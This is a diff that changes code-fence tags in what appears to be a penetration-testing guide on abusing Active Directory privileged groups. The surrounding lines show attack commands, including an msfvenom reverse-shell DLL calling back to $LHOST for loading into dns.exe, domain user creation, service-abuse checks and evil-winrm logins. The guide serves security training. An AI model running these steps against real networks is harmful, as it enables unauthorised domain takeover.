@@ -7,7 +7,7 @@ Privileged groups are one of the most reliable paths to domain compromise. Membe
 
 Check group membership before anything else: knowing what groups a compromised account is in tells you what you can do next without touching a single exploit.
 
-```bash
+```bash wrap
 # Check what groups a user belongs to
 net user $TARGET /domain
 Get-ADUser -Identity $TARGET -Properties MemberOf | Select -ExpandProperty MemberOf
@@ -27,7 +27,7 @@ The highest privilege group in the domain. Members have full control over all do
 
 Offensive value: full domain compromise. If you land here, dump NTDS, forge Golden Tickets, and do whatever you want.
 
-```bash
+```bash wrap
 # Check if you're DA
 whoami /groups | findstr "Domain Admins"
 
@@ -54,7 +54,7 @@ Can create, modify, and delete most user and group accounts in the domain. Canno
 
 Offensive value: create a new user and add them to groups you control. Can also reset passwords of non-privileged users.
 
-```bash
+```bash wrap
 # Create a user
 net user hacker Pass123! /add /domain
 
@@ -68,7 +68,7 @@ Can log into domain controllers interactively, start and stop services, perform 
 
 Offensive value: direct DC access without being DA. Can start and stop services on the DC; abuse a writable service binPath to get SYSTEM on the DC.
 
-```bash
+```bash wrap
 # Check services you can modify
 .\SharpUp.exe audit
 
@@ -87,7 +87,7 @@ Members can bypass NTFS permissions to read and write any file on the system, in
 
 Offensive value: can copy SAM, SYSTEM, and NTDS.dit directly from a DC without being DA. One of the most reliable privesc paths when you land an account in this group.
 
-```bash
+```bash wrap
 # Check if you're a Backup Operator
 whoami /groups | findstr "Backup"
 
@@ -113,7 +113,7 @@ Can manage printers and printer drivers on DCs, and log into DCs interactively. 
 
 Offensive value: SeLoadDriverPrivilege can be abused to load a malicious kernel driver and escalate to SYSTEM. Classic Capcom.sys / EopLoadDriver exploit path.
 
-```bash
+```bash wrap
 # Check for SeLoadDriverPrivilege
 whoami /priv | findstr SeLoadDriverPrivilege
 
@@ -127,7 +127,7 @@ Members can connect to machines via RDP. No elevated privileges on the machine i
 
 Offensive value: lateral movement when WinRM and SMB are blocked but RDP (3389) is open.
 
-```bash
+```bash wrap
 # Check RDP access
 nxc rdp $IP -u $USER -p $PASSWORD
 
@@ -141,7 +141,7 @@ Members can connect via WinRM (PowerShell Remoting), port 5985/5986. Added in Wi
 
 Offensive value: evil-winrm access without being a local admin. Common foothold for lateral movement once you have credentials.
 
-```bash
+```bash wrap
 nxc winrm $IP -u $USER -p $PASSWORD
 evil-winrm -i $IP -u $USER -p $PASSWORD
 ```
@@ -152,7 +152,7 @@ Members can manage the DNS service on domain controllers and load a DLL into the
 
 Offensive value: one of the most underrated privesc paths. Load a malicious DLL into dns.exe to get a SYSTEM shell on the DC without ever touching DA.
 
-```bash
+```bash wrap
 # Generate malicious DLL
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f dll -o evil.dll
 
@@ -173,7 +173,7 @@ A security group that enforces strict Kerberos protections on members: no NTLM a
 
 From an attacker's perspective this is a blocker. If your target is in Protected Users, PtH fails, delegation attacks fail, and credentials won't be in LSASS memory after logoff. Check before wasting time on those paths.
 
-```bash
+```bash wrap
 # Check if a user is Protected
 Get-ADGroupMember -Identity "Protected Users" | Select Name
 
@@ -187,7 +187,7 @@ Members can create Group Policy Objects in the domain. Creating a GPO alone is n
 
 Offensive value: create a malicious GPO (add local admin, deploy a startup script, drop a reverse shell) and link it to a target OU. Requires separate link permissions on the OU.
 
-```powershell
+```powershell wrap
 # Enumerate GPO link permissions with PowerView
 Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
     $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "Write"
@@ -205,7 +205,7 @@ You will encounter these in BloodHound as a MemberOf edge from a service account
 
 Offensive value: if the account you compromised is in a NOACCESS group, it explains why your access is being denied despite valid credentials. If you have write rights on the group object, you can remove the account from it to restore access.
 
-```bash
+```bash wrap
 # Check what groups your account is in (look for restrictive names)
 net user $USER /domain
 Get-ADUser -Identity $USER -Properties MemberOf | Select -ExpandProperty MemberOf
